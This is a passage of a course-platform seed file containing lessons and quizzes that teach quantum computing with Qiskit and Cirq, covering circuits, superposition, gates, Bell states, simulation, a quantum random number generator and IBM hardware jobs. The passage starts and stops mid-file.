one-way operation, before this line the qubit's state is quantum information, after it, you have an ordinary classical bit.\n- \`qc.draw()\` renders the circuit as an ASCII diagram, useful for sanity-checking what you built before running it.\n\n> [!NOTE]\n> Every code block in this course needs a real local Python + Qiskit install to run, quantum simulation depends on compiled numerical libraries this course's browser sandbox doesn't have. Treat this course like the Pygame or Kivy projects: read, understand, and run the code on your own machine.`
    ),
    quiz: {
      title: 'Setup and Your First Circuit Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does QuantumCircuit(1, 1) allocate?',
          options: [
            'Two qubits',
            'One qubit and one classical bit',
            'One classical bit only',
            'A pre-built Bell state',
          ],
          answer: 'One qubit and one classical bit',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The X gate is the quantum equivalent of a classical NOT, it flips |0> to |1> and |1> to |0>.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'qc.____() renders a circuit as an ASCII diagram so you can sanity-check it before running.',
          options: [],
          answer: 'draw',
        },
      ],
    },
  },
  {
    title: 'Qubits and Superposition',
    content: lessonContent(
      'Qubits and Superposition',
      `A qubit doesn't have to be definitely 0 or definitely 1, it can be in a **superposition**, a mix of both, described by two numbers (**amplitudes**) whose squared magnitudes give the probability of measuring each outcome.\n\n## The Hadamard gate\n\n\`\`\`\nfrom qiskit import QuantumCircuit\nfrom qiskit.quantum_info import Statevector\n\nqc = QuantumCircuit(1)\nqc.h(0)  # put the qubit into an equal superposition of |0> and |1>\n\nstate = Statevector(qc)\nprint(state)\nprint(state.probabilities())  # [0.5, 0.5]\n\`\`\`\n\n- \`qc.h(0)\` applies the **Hadamard gate**, it takes a qubit starting at \`|0>\` and puts it into an equal superposition, neither definitely 0 nor definitely 1.\n- \`Statevector(qc)\` computes the circuit's exact quantum state mathematically, without simulating any randomness, useful for inspecting *what a circuit does* before introducing measurement noise.\n- \`state.probabilities()\` converts the state into the probability of measuring each outcome, here \`[0.5, 0.5]\`: a 50% chance of \`0\`, 50% chance of \`1\`.\n\n## Measurement collapses superposition\n\n\`\`\`\nqc_measured = QuantumCircuit(1, 1)\nqc_measured.h(0)\nqc_measured.measure(0, 0)\n\n# Once measured, the outcome is a single definite bit (0 or 1), chosen randomly\n# according to the probabilities above, the superposition is gone.\nprint(qc_measured.draw())\n\`\`\`\n\nBefore measurement, a qubit in superposition genuinely holds both possibilities at once, that's not just "unknown to us", it's a real physical difference from a classical bit. The instant you measure it, that superposition **collapses** to one definite outcome, chosen randomly with the probabilities \`Statevector\` predicted. You cannot inspect a qubit's superposition without destroying it, this is the core reason quantum algorithms are designed so differently from classical ones.\n\n> [!TIP]\n> \`Statevector\` is a teaching and debugging tool, it requires knowing the exact mathematical state, which is only possible on a simulator. Real quantum hardware can only ever give you measurement outcomes, never a peek at the superposition itself.`
    ),
    quiz: {
      title: 'Qubits and Superposition Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the Hadamard gate (h) do to a qubit starting in state |0>?',
          options: [
            'Flips it to |1>',
            'Puts it into an equal superposition of |0> and |1>',
            'Measures it immediately',
            'Deletes the qubit',
          ],
          answer: 'Puts it into an equal superposition of |0> and |1>',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Measuring a qubit in superposition collapses it to one definite classical outcome.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'state.____() converts a Statevector into the probability of measuring each possible outcome.',
          options: [],
          answer: 'probabilities',
        },
      ],
    },
  },
  {
    title: 'Quantum Gates',
    content: lessonContent(
      'Quantum Gates',
      `Quantum programs are built from **gates**, operations applied to one or more qubits. Unlike some classical logic gates (like AND, which throws information away), every quantum gate is **reversible**, you could always run it backwards to recover the input.\n\n## Common single-qubit gates\n\n\`\`\`\nfrom qiskit import QuantumCircuit\n\nqc = QuantumCircuit(1)\nqc.x(0)  # NOT: flips |0> <-> |1>\nqc.z(0)  # flips the sign of the |1> amplitude (no visible effect until combined with h)\nqc.h(0)  # Hadamard: creates/undoes superposition\n\nprint(qc.draw())\n\`\`\`\n\n\`x\`, \`z\`, and \`h\` are the gates you'll reach for constantly: \`x\` for a classical-style flip, \`h\` for superposition, \`z\` mostly matters when combined with other gates (its effect is invisible until you interfere it with something else, a recurring theme in quantum algorithms).\n\n## A two-qubit gate: CNOT\n\n\`\`\`\nqc = QuantumCircuit(2)\nqc.h(0)      # put qubit 0 into superposition\nqc.x(1)      # flip qubit 1 to |1>\nqc.cx(0, 1)  # CNOT: flip qubit 1 IF qubit 0 measures as |1>\n\nprint(qc.draw())\n\`\`\`\n\n\`qc.cx(control, target)\` is the **CNOT** (controlled-NOT) gate: it flips the \`target\` qubit, but only conditioned on the \`control\` qubit's state. Applied to a qubit already in superposition, CNOT is what links two qubits' fates together, this is exactly how **entanglement** gets created, covered next.\n\n## Building bigger circuits\n\nGates chain together just like statements in any program:\n\n\`\`\`\nqc = QuantumCircuit(3)\nqc.h(0)\nqc.cx(0, 1)\nqc.cx(1, 2)\nqc.x(2)\n\nprint(qc.draw())\n\`\`\`\n\nEach line appends one more gate to the circuit, in order, exactly the sequence they'll be applied when the circuit runs.\n\n> [!NOTE]\n> "Reversible" doesn't mean "does nothing", it means no information is thrown away, you could always build a circuit that undoes any sequence of gates. Measurement is the one operation in this course that is **not** reversible, once you measure, the superposition is gone for good.`
    ),
    quiz: {
      title: 'Quantum Gates Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does qc.cx(0, 1) do?',
          options: [
            'Measures qubit 0',
            'Flips qubit 1, but only if qubit 0 is |1> (CNOT)',
            'Copies qubit 1 into qubit 0',
            'Deletes qubit 1',
          ],
          answer: 'Flips qubit 1, but only if qubit 0 is |1> (CNOT)',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every quantum gate is reversible, no information is thrown away.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The CNOT gate is Qiskit\'s two-qubit gate, applied in code as qc.____(control, target).',
          options: [],
          answer: 'cx',
        },
      ],
    },
  },
  {
    title: 'Entanglement and Bell States',
    content: lessonContent(
      'Entanglement and Bell States',
      `Combining a Hadamard gate with a CNOT produces one of the most famous states in quantum computing: a **Bell state**, two qubits so correlated that measuring one instantly tells you the other's outcome, no matter how far apart they are.\n\n## Building a Bell state\n\n\`\`\`\nfrom qiskit import QuantumCircuit\nfrom qiskit.quantum_info import Statevector\n\nqc = QuantumCircuit(2)\nqc.h(0)      # qubit 0 into superposition\nqc.cx(0, 1)  # entangle qubit 1 with qubit 0\n\nstate = Statevector(qc)\nprint(state)\nprint(state.probabilities())  # ~50% |00>, ~50% |11>, 0% |01>, 0% |10>\n\`\`\`\n\nNotice what's *missing*: \`|01>\` and \`|10>\` have zero probability. Each qubit, measured on its own, is still individually random (50/50), but the two outcomes are **perfectly correlated**, you'll always get \`00\` or \`11\`, never a mismatch.\n\n## Why this isn't just "correlated dice"\n\nTwo classical coins could also be correlated, if you rig them in advance to always land the same way. The difference is that a Bell state's qubits don't have a predetermined outcome *at all* until measured, and yet the correlation still holds perfectly, from any distance, immediately. This is what physicists mean by **entanglement**: a genuinely quantum kind of correlation with no classical equivalent, and it's the resource that powers algorithms like quantum teleportation and superdense coding, and gives many quantum algorithms their speedup.\n\n## Verifying it experimentally\n\nRunning the circuit many times and checking that only \`00\`/\`11\` ever appear (never \`01\`/\`10\`) is exactly how you'd verify entanglement on a real device, where you can't just print the \`Statevector\` directly, covered in the next lesson.\n\n> [!TIP]\n> A Bell state is the simplest possible entangled state, just \`h\` then \`cx\`, but it's the building block nearly every more advanced quantum algorithm relies on. If you understand why \`|01>\`/\`|10>\` have zero probability here, you understand the core idea of entanglement.`
    ),
    quiz: {
      title: 'Entanglement and Bell States Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In the Bell state built with h(0) then cx(0, 1), which outcomes have zero probability?',
          options: ['00 and 11', '01 and 10', 'Only 00', 'None, all four are equally likely'],
          answer: '01 and 10',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "In a Bell state, each individual qubit's measurement outcome is still random (50/50) on its own.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A genuinely quantum correlation between qubits, with no classical equivalent, is called ____.',
          options: [],
          answer: 'entanglement',
        },
      ],
    },
  },
  {
    title: 'Measurement and Running on a Simulator',
    content: lessonContent(
      'Measurement and Running on a Simulator',
      `\`Statevector\` gives exact probabilities, but that's only possible on a simulator that can peek at the math directly. Real quantum hardware (and a more realistic simulator) only ever gives you **measurement outcomes**, one bitstring per run. This lesson runs a circuit many times and looks at the resulting distribution.\n\n## Running with shots\n\n\`\`\`\nfrom qiskit import QuantumCircuit\nfrom qiskit_aer import AerSimulator\n\nqc = QuantumCircuit(2, 2)\nqc.h(0)\nqc.cx(0, 1)\nqc.measure([0, 1], [0, 1])\n\nsimulator = AerSimulator()\nresult = simulator.run(qc, shots=1024).result()\ncounts = result.get_counts()\nprint(counts)  # e.g. {'00': 512, '11': 512}\n\`\`\`\n\n- \`AerSimulator()\` is a simulator that behaves like real hardware: it doesn't hand you the exact quantum state, only the outcome of measuring it, one **shot** at a time.\n- \`shots=1024\` runs the *entire circuit* 1024 times independently (each one a fresh superposition, fresh measurement), since a single measurement only ever gives you one bitstring, you need many repetitions to see the underlying probability distribution.\n- \`result.get_counts()\` returns a dictionary mapping each observed bitstring to how many of the 1024 shots produced it.\n\n## Statistical noise\n\nRun the code above a few times, the exact counts won't be identically \`512\`/\`512\` every time, maybe \`498\`/\`526\`, this is expected: with a finite number of shots, you're *estimating* the true 50/50 probability, not measuring it exactly. More shots narrow that estimate, at the cost of more computation (or, on real hardware, more time and cost).\n\n\`\`\`\n# fewer shots = noisier estimate of the true probabilities\nresult_small = simulator.run(qc, shots=10).result()\nprint(result_small.get_counts())  # could easily be lopsided, e.g. {'00': 7, '11': 3}\n\`\`\`\n\n> [!NOTE]\n> Notice \`counts\` still only ever contains \`'00'\` and \`'11'\`, exactly the entanglement result predicted in the previous lesson's \`Statevector\` probabilities, just observed empirically through repeated measurement instead of read directly from the math.`
    ),
    quiz: {
      title: 'Measurement and Simulation Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does simulator.run(qc, shots=1024) run the circuit 1024 times instead of once?',
          options: [
            "It's required by AerSimulator's API for no real reason",
            'A single measurement only gives one bitstring, many repetitions are needed to estimate the underlying probability distribution',
            'To make the qubits more entangled',
            'To reduce the number of gates needed',
          ],
          answer: 'A single measurement only gives one bitstring, many repetitions are needed to estimate the underlying probability distribution',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'With a small number of shots, the observed counts can be noticeably lopsided compared to the true probabilities.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'result.get_____() returns a dict mapping each observed bitstring to how many shots produced it.',
          options: [],
          answer: 'counts',
        },
      ],
    },
  },
  {
    title: 'Building a Quantum Random Number Generator',
    content: lessonContent(
      'Building a Quantum Random Number Generator',
      `A classical "random" number generator is actually **pseudo-random**: a deterministic algorithm that just looks random, given the same seed, it always produces the same sequence. A qubit in superposition is different, its measurement outcome is fundamentally, physically unpredictable, not just hard to predict. This lesson builds a genuine quantum random number generator (QRNG).\n\n## The idea\n\nPut every qubit into an equal superposition with \`h\`, measure them all, and read the resulting bitstring as a binary number:\n\n\`\`\`\nfrom qiskit import QuantumCircuit\nfrom qiskit_aer import AerSimulator\n\ndef quantum_random_bits(n_bits):\n    qc = QuantumCircuit(n_bits, n_bits)\n    qc.h(range(n_bits))              # put every qubit into superposition\n    qc.measure(range(n_bits), range(n_bits))\n\n    simulator = AerSimulator()\n    result = simulator.run(qc, shots=1).result()  # one measurement, one random bitstring\n    bitstring = list(result.get_counts().keys())[0]\n    return int(bitstring, 2)         # parse the bitstring as base-2\n\nprint(quantum_random_bits(8))   # a random integer from 0 to 255\nprint(quantum_random_bits(8))   # a different one, genuinely unpredictable\n\`\`\`\n\n- \`qc.h(range(n_bits))\` applies \`h\` to *every* qubit at once, \`range(n_bits)\` expands to \`[0, 1, ..., n_bits - 1]\`, and Qiskit accepts a list of qubit indices anywhere a single index is accepted.\n- \`shots=1\` is deliberate here, unlike the last lesson, this isn't about estimating a probability distribution, it's about getting exactly one genuinely random outcome.\n- \`int(bitstring, 2)\` parses the measured bitstring (like \`'10110100'\`) as a base-2 number, converting 8 random bits into a random integer from 0-255.\n\n## Why this matters\n\nReal quantum random number generators are used in cryptography today, precisely because their unpredictability doesn't rely on hiding an algorithm or a seed, it's a fundamental physical property. A classical pseudo-random generator, no matter how sophisticated, is deterministic under the hood, if you know the seed and the algorithm, you can predict every "random" number it will ever produce.\n\n> [!TIP]\n> Try increasing \`n_bits\` and calling \`quantum_random_bits\` several times, on a real quantum computer (not just this ideal simulator), this is genuinely how some production QRNG services work.`
    ),
    quiz: {
      title: 'Quantum RNG Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why is a quantum random number generator fundamentally different from a classical pseudo-random one?',
          options: [
            "It's just faster",
            "A classical generator is a deterministic algorithm, a qubit's measurement outcome is fundamentally, physically unpredictable",
            'It uses more bits',
            'It requires an internet connection',
          ],
          answer: "A classical generator is a deterministic algorithm, a qubit's measurement outcome is fundamentally, physically unpredictable",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'quantum_random_bits uses shots=1 because it needs exactly one random outcome, not a probability distribution.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'int(bitstring, 2) parses a string of bits as a base-____ number.',
          options: [],
          answer: '2',
        },
      ],
    },
  },
  {
    title: 'Running on Real Quantum Hardware',
    content: lessonContent(
      'Running on Real Quantum Hardware',
      `Everything so far has run on \`AerSimulator\`, an ideal simulator with no imperfections. Real quantum computers are a different world: physical qubits are extremely sensitive to their environment, and every gate and measurement introduces a small amount of error.\n\n## Submitting a job to IBM Quantum\n\n\`\`\`\nfrom qiskit_ibm_runtime import QiskitRuntimeService, SamplerV2 as Sampler\n\nservice = QiskitRuntimeService(channel='ibm_quantum', token='YOUR_IBM_QUANTUM_TOKEN')\nbackend = service.least_busy(operational=True, simulator=False)\n\nsampler = Sampler(backend)\njob = sampler.run([qc])\nresult = job.result()\nprint(result[0].data.meas.get_counts())\n\`\`\`\n\n*This needs a free IBM Quantum account, a real API token, and network access, so it's read-only here, sign up at quantum.ibm.com to run this yourself.* \`service.least_busy(...)\` picks whichever real quantum backend currently has the shortest queue, since IBM's quantum hardware is a shared resource, your job runs alongside everyone else's.\n\n## Noise changes your results\n\nOn \`AerSimulator\`, the Bell state from earlier lessons gives *only* \`00\`/\`11\`. On real hardware, you'll typically see a small number of \`01\`/\`10\` results too, not because the physics is wrong, but because of:\n\n- **Gate errors**: a gate doesn't perfectly implement its ideal mathematical operation, there's always a tiny imprecision.\n- **Decoherence**: a qubit's quantum state slowly degrades from interacting with its environment (heat, electromagnetic noise), the longer a circuit takes to run, the more this matters.\n- **Measurement errors**: even reading out the final result isn't perfect, occasionally a \`0\` is misread as \`1\` or vice versa.\n\n## Queueing and cost\n\nUnlike the instant local simulator, a real backend job joins a queue, and depending on the provider and plan, may have limits on how many you can run. This is why every lesson in this course develops and debugges on \`AerSimulator\` first, real hardware is where you *verify* a circuit you already trust, not where you iterate on it.\n\n> [!NOTE]\n> Comparing your Bell-state results between \`AerSimulator\` (this course's earlier lessons) and real hardware (this lesson) is one of the clearest ways to see, empirically, that noise is a real engineering challenge in quantum computing today, not just a theoretical footnote.`
    ),
    quiz: {
      title: 'Real Quantum Hardware Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Why might a Bell state circuit produce a small number of '01'/'10' results on real hardware, when AerSimulator gives only '00'/'11'?",
          options: [
            'The circuit code is different on real hardware',
            'Real hardware has gate errors, decoherence, and measurement errors that an ideal simulator does not model',
            'Real qubits use a different gate set entirely',
            'IBM deliberately randomizes results',
          ],
          answer: 'Real hardware has gate errors, decoherence, and measurement errors that an ideal simulator does not model',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'service.least_busy(...) selects the real backend with the shortest current queue.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "The gradual degradation of a qubit's quantum state from interacting with its environment is called ____.",
          options: [],
          answer: 'decoherence',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build and Verify an Entangled Circuit',
    content: lessonContent(
      'Final Project: Build and Verify an Entangled Circuit',
      `Every piece from this course now exists on its own: building circuits, superposition, gates, entanglement, shot-based measurement, and a quantum random number generator. This final project assembles several of them into one small, verifiable quantum program.\n\n## Requirements\n\nYour finished \`quantum_project.py\` should satisfy every one of these:\n\n1. Build a 2-qubit Bell state circuit (\`h\` then \`cx\`).\n2. Inspect it with \`Statevector\` and print its exact probabilities, confirming \`|01>\`/\`|10>\` are (numerically) zero.\n3. Run the same circuit on \`AerSimulator\` with at least 1000 shots, and print the resulting \`counts\`.\n4. Write a Python function \`verify_entanglement(counts)\` that checks every observed bitstring in \`counts\` is either \`'00'\` or \`'11'\` (allow a small tolerance if you experiment with real hardware in the stretch goals), and prints whether entanglement was verified.\n5. Reuse (or rewrite) the \`quantum_random_bits(n_bits)\` function from the RNG lesson, and use it to generate and print 5 random numbers between 0 and 255.\n\n\`\`\`\nfrom qiskit import QuantumCircuit\nfrom qiskit.quantum_info import Statevector\nfrom qiskit_aer import AerSimulator\n\ndef build_bell_circuit():\n    qc = QuantumCircuit(2, 2)\n    qc.h(0)\n    qc.cx(0, 1)\n    return qc\n\ndef verify_entanglement(counts):\n    valid = all(bitstring in ('00', '11') for bitstring in counts)\n    print('Entanglement verified!' if valid else 'Unexpected outcome, entanglement broken or noisy hardware.')\n    return valid\n\n# 1-2: build and inspect\nqc = build_bell_circuit()\nstate = Statevector(qc)\nprint('Probabilities:', state.probabilities())\n\n# 3-4: run and verify\nqc.measure([0, 1], [0, 1])\nsimulator = AerSimulator()\ncounts = simulator.run(qc, shots=1000).result().get_counts()\nprint('Counts:', counts)\nverify_entanglement(counts)\n\`\`\`\n\n## Stretch goals\n\n- Run your circuit on real IBM Quantum hardware (free tier) and compare the counts to the ideal simulator, is entanglement still verified within a reasonable tolerance?\n- Build a 3-qubit **GHZ state** (\`h(0)\`, then \`cx(0, 1)\`, then \`cx(1, 2)\`) and extend \`verify_entanglement\` to check that only \`'000'\`/\`'111'\` appear.\n- Add a simple **quantum coin flip** game: use \`quantum_random_bits(1)\` to decide a winner, and explain in a comment why this is fundamentally fairer than \`random.randint(0, 1)\`.\n- Plot the \`counts\` histogram with \`matplotlib\` instead of just printing the dictionary.\n\nSubmit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
  },
];

const cirqLessons: SeedLesson[] = [
  {
    title: 'Setup and Your First Circuit',
    content: lessonContent(
      'Setup and Your First Circuit',
      `**Cirq** is Google's open-source Python SDK for quantum computing. It covers the same core ideas as any quantum SDK, qubits, gates, superposition, entanglement, and measurement, with its own particular style: circuits are built by appending **operations** (a gate applied to specific qubits) rather than calling a method per gate type.\n\n## Installing Cirq\n\nLike Qiskit, Cirq depends on compiled numerical libraries not available in this course's browser sandbox, write and run this project locally with a real Python install.\n\n\`\`\`bash\npip install cirq\n\`\`\`\n\n## Qubits and circuits\n\n\`\`\`\nimport cirq\n\nqubit = cirq.LineQubit(0)\ncircuit = cirq.Circuit()\ncircuit.append(cirq.X(qubit))\ncircuit.append(cirq.measure(qubit, key='result'))\n\nprint(circuit)\n\`\`\`\n\n- \`cirq.LineQubit(0)\` creates a qubit identified by position \`0\` on an imaginary line, Cirq's qubits are explicit objects you create and pass around, rather than implicit indices into a circuit.\n- \`cirq.Circuit()\` starts an empty circuit, and \`.append(...)\` adds **operations** to it, one at a time (or as a list).\n- \`cirq.X(qubit)\` is an **operation**: the \`X\` gate applied to a specific qubit. In Cirq, gates (\`cirq.X\`) and operations (a gate applied to a qubit, \`cirq.X(qubit)\`) are distinct: a gate is reusable and qubit-agnostic, an operation is that gate bound to a specific target.\n- \`cirq.measure(qubit, key='result')\` measures the qubit and tags the result with a string \`key\`, used later to look up that specific measurement's outcome (Cirq doesn't use a separate classical register the way Qiskit does).\n- \`print(circuit)\` renders an ASCII diagram of the circuit, just like Qiskit's \`draw()\`.\n\n> [!NOTE]\n> Every code block in this course needs a real local Python + Cirq install to run, quantum simulation depends on compiled numerical libraries this course's browser sandbox doesn't have. Treat this course like the Pygame or Kivy projects: read, understand, and run the code on your own machine.`
    ),
    quiz: {
      title: 'Setup and Your First Circuit Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'In Cirq, what is the difference between a gate and an operation?',
          options: [
            "There's no difference, the terms are interchangeable",
            'A gate is reusable and qubit-agnostic, an operation is that gate applied to specific qubit(s)',
            'A gate can only be used once',
            'An operation is a whole circuit',
          ],
          answer: 'A gate is reusable and qubit-agnostic, an operation is that gate applied to specific qubit(s)',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "cirq.measure(qubit, key='result') tags a measurement with a string key used to look up its outcome later.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'circuit.____(operation) adds an operation to a Cirq circuit.',
          options: [],
          answer: 'append',
        },
      ],
    },
  },
  {
    title: 'Qubits and Superposition',
    content: lessonContent(
      'Qubits and Superposition',
      `Just like Qiskit's Hadamard gate, Cirq's \`cirq.H\` puts a qubit into an equal superposition, a genuine mix of \`0\` and \`1\` until measured.\n\n## Simulating without measuring\n\n\`\`\`\nimport cirq\n\nqubit = cirq.LineQubit(0)\ncircuit = cirq.Circuit()\ncircuit.append(cirq.H(qubit))\n\nsimulator = cirq.Simulator()\nresult = simulator.simulate(circuit)\nprint(result.dirac_notation())          # something like 0.71|0> + 0.71|1>\nprint(abs(result.final_state_vector) ** 2)  # [0.5, 0.5]\n\`\`\`\n\n- \`cirq.Simulator()\` is Cirq's local simulator, \`.simulate(circuit)\` runs a circuit **without any measurement**, returning the exact final quantum state (only possible on a simulator, exactly like Qiskit's \`Statevector\`).\n- \`result.dirac_notation()\` prints the state using physicists' bra-ket notation, \`|0>\` and \`|1>\` are the two basis states, and the numbers in front are amplitudes.\n- \`result.final_state_vector\` is the raw list of complex amplitudes, squaring their absolute values (\`abs(...) ** 2\`) converts each amplitude into a probability, mirroring Qiskit's \`state.probabilities()\`.\n\n## Measurement still collapses the state\n\n\`\`\`\ncircuit_measured = cirq.Circuit()\ncircuit_measured.append(cirq.H(qubit))\ncircuit_measured.append(cirq.measure(qubit, key='result'))\n\nresult = simulator.simulate(circuit_measured)\nprint(result.measurements['result'])  # a single definite outcome, 0 or 1\n\`\`\`\n\n\`result.measurements\` is a dictionary keyed by the measurement \`key\`s you assigned with \`cirq.measure(..., key=...)\`, once a qubit is measured, its superposition is gone, exactly as in Qiskit, the physics doesn't change, only the SDK's syntax does.\n\n> [!TIP]\n> Cirq's \`.simulate()\` (no measurement, exact state) versus \`.run()\` (with measurement, shot-based) map directly onto Qiskit's \`Statevector\` versus \`AerSimulator\`, same two-step teaching approach, different method names.`
    ),
    quiz: {
      title: 'Qubits and Superposition Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does simulator.simulate(circuit) return when the circuit has no measurement?',
          options: [
            'A single random bitstring',
            "The exact final quantum state (amplitudes), only possible on a simulator",
            'An error, simulate() requires measurement',
            'The circuit diagram',
          ],
          answer: "The exact final quantum state (amplitudes), only possible on a simulator",
        },
        {
          type: 'TRUE_FALSE',
          prompt: "result.measurements is a dictionary keyed by the string 'key' assigned in cirq.measure(...).",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'result.____ ____() prints a quantum state using physicists\' bra-ket notation like 0.71|0> + 0.71|1>.',
          options: [],
          answer: 'dirac notation',
        },
      ],
    },
  },
  {
    title: 'Quantum Gates',
    content: lessonContent(
      'Quantum Gates',
      `Cirq ships the same core gate set you'd expect from any quantum SDK, applied through the operation pattern from lesson 1: \`gate(qubit)\`.\n\n## Single-qubit gates\n\n\`\`\`\nimport cirq\n\nq = cirq.LineQubit(0)\ncircuit = cirq.Circuit()\ncircuit.append(cirq.X(q))  # NOT: flips |0> <-> |1>\ncircuit.append(cirq.Z(q))  # flips the sign of the |1> amplitude\ncircuit.append(cirq.H(q))  # Hadamard: creates/undoes superposition\n\nprint(circuit)\n\`\`\`\n\nExactly the same roles as Qiskit's \`x\`, \`z\`, and \`h\`, \`X\` for a classical-style flip, \`H\` for superposition, \`Z\` mostly useful combined with other gates.\n\n## A two-qubit gate: CNOT\n\n\`\`\`\nq0, q1 = cirq.LineQubit.range(2)\n\ncircuit = cirq.Circuit()\ncircuit.append(cirq.H(q0))          # put q0 into superposition\ncircuit.append(cirq.X(q1))          # flip q1 to |1>\ncircuit.append(cirq.CNOT(q0, q1))   # flip q1 IF q0 measures as |1>\n\nprint(circuit)\n\`\`\`\n\n\`cirq.LineQubit.range(2)\` is a convenience for creating multiple qubits at once, equivalent to \`[cirq.LineQubit(0), cirq.LineQubit(1)]\`. \`cirq.CNOT(control, target)\` behaves identically to Qiskit's \`cx\`, it's the gate that lets one qubit's state influence another, the mechanism behind entanglement.\n\n## Chaining operations\n\nAppending accepts a single operation or a list, both build up the circuit the same way:\n\n\`\`\`\nq0, q1, q2 = cirq.LineQubit.range(3)\n\ncircuit = cirq.Circuit([\n    cirq.H(q0),\n    cirq.CNOT(q0, q1),\n    cirq.CNOT(q1, q2),\n    cirq.X(q2),\n])\n\nprint(circuit)\n\`\`\`\n\nPassing a list directly to \`cirq.Circuit([...])\` is a common shorthand once you know every operation you want up front, rather than calling \`.append()\` repeatedly.\n\n> [!NOTE]\n> Cirq operations are just as reversible as Qiskit's, the underlying physics of quantum gates doesn't depend on which SDK you're using, only the Python syntax for expressing it changes.`
    ),
    quiz: {
      title: 'Quantum Gates Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does cirq.CNOT(q0, q1) do?',
          options: [
            'Measures q0',
            'Flips q1, but only if q0 is |1>',
            'Swaps q0 and q1',
            'Deletes q1',
          ],
          answer: 'Flips q1, but only if q0 is |1>',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'cirq.LineQubit.range(3) is a shorthand for creating 3 LineQubits at once.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'circuit.append(...) accepts either a single operation or a ____ of operations.',
          options: [],
          answer: 'list',
        },
      ],
    },
  },
  {
    title: 'Entanglement and Bell States',
    content: lessonContent(
      'Entanglement and Bell States',
      `The same \`H\` + \`CNOT\` combination that builds a Bell state in Qiskit builds one in Cirq too, entanglement is a property of the physics, not of any particular SDK.\n\n## Building and inspecting a Bell state\n\n\`\`\`\nimport cirq\n\nq0, q1 = cirq.LineQubit.range(2)\n\ncircuit = cirq.Circuit([\n    cirq.H(q0),\n    cirq.CNOT(q0, q1),\n])\n\nsimulator = cirq.Simulator()\nresult = simulator.simulate(circuit)\nprint(result.dirac_notation())\nprint(abs(result.final_state_vector) ** 2)  # ~[0.5, 0, 0, 0.5] for |00>, |01>, |10>, |11>\n\`\`\`\n\nThe probability vector has 4 entries, one per possible 2-qubit outcome in order \`00, 01, 10, 11\`. Just like Qiskit's Bell state, only \`00\` and \`11\` have non-zero probability, \`01\`/\`10\` are impossible: measure either qubit and you instantly know the other's outcome.\n\n## Verifying with repeated measurement\n\n\`\`\`\ncircuit_measured = cirq.Circuit([\n    cirq.H(q0),\n    cirq.CNOT(q0, q1),\n    cirq.measure(q0, q1, key='result'),\n])\n\nresult = simulator.run(circuit_measured, repetitions=1000)\nprint(result.histogram(key='result'))\n\`\`\`\n\n\`cirq.measure(q0, q1, key='result')\` measures both qubits under one shared key, and \`.run(circuit, repetitions=1000)\` (Cirq's equivalent of Qiskit's \`shots\`) executes the circuit 1000 times. \`result.histogram(key='result')\` tallies the outcomes, covered in full in the next lesson.\n\n> [!TIP]\n> Whichever SDK you use, the pattern for verifying entanglement is identical: build \`H\` + \`CNOT\`, run it many times, and confirm the "impossible" outcomes (\`01\`/\`10\`) never (or almost never, on noisy real hardware) appear.`
    ),
    quiz: {
      title: 'Entanglement and Bell States Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "In the 4-entry probability vector [00, 01, 10, 11] for a Cirq Bell state, which entries are zero?",
          options: ['Index 0 and 3 (00 and 11)', 'Index 1 and 2 (01 and 10)', 'Only index 0', 'None are zero'],
          answer: 'Index 1 and 2 (01 and 10)',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "cirq.Simulator().run(circuit, repetitions=1000) is Cirq's equivalent of Qiskit's shots=1000.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Building a Bell state in any quantum SDK requires an H gate followed by a ____ gate.',
          options: [],
          answer: 'CNOT',
        },
      ],
    },
  },
  {
    title: 'Measurement and Running the Simulator',
    content: lessonContent(
      'Measurement and Running the Simulator',
